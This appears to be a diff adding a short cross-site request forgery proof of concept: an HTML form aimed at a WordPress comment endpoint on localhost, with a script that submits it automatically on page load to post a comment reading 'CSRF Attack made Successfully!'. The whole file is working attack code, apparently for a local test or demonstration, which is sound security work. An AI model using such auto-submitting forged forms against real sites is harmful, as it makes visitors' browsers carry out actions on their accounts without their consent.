@@ -1,0 +1,9 @@
+<form action="http://localhost:8080/wp-comments-post.php" method="POST">
+    <input name="comment" value="CSRF Attack made Successfully!" />
+    <input name="comment_post_ID" value="1" />
+</form>
+
+<script>
+    var form = document.querySelector("form");
+    form.submit();
+</script>
